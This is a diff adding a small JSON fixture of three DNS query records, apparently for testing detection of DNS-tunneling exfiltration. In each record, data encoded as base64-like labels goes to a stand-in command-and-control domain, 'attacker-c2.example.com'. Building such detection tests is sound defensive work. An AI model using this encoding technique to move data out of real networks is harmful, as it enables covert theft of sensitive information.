@@ -1,0 +1,32 @@
+[
+  {
+    "timestamp": 1735689600.0,
+    "src_ip": "10.0.0.5",
+    "dst_ip": "8.8.8.8",
+    "src_port": 49000,
+    "dst_port": 53,
+    "protocol": "DNS",
+    "payload_size": 41,
+    "dns_query": "aGVsbG93b3JsZGhlbGxvd29ybGQxMjM.attacker-c2.example.com"
+  },
+  {
+    "timestamp": 1735689602.0,
+    "src_ip": "10.0.0.5",
+    "dst_ip": "8.8.8.8",
+    "src_port": 49001,
+    "dst_port": 53,
+    "protocol": "DNS",
+    "payload_size": 42,
+    "dns_query": "dGhpc2lzYXNlY3JldG1lc3NhZ2VoZXJl.attacker-c2.example.com"
+  },
+  {
+    "timestamp": 1735689604.0,
+    "src_ip": "10.0.0.5",
+    "dst_ip": "8.8.8.8",
+    "src_port": 49002,
+    "dst_port": 53,
+    "protocol": "DNS",
+    "payload_size": 44,
+    "dns_query": "c2Vuc2l0aXZlZGF0YWV4ZmlsdHJhdGlvbg.attacker-c2.example.com"
+  }
+]
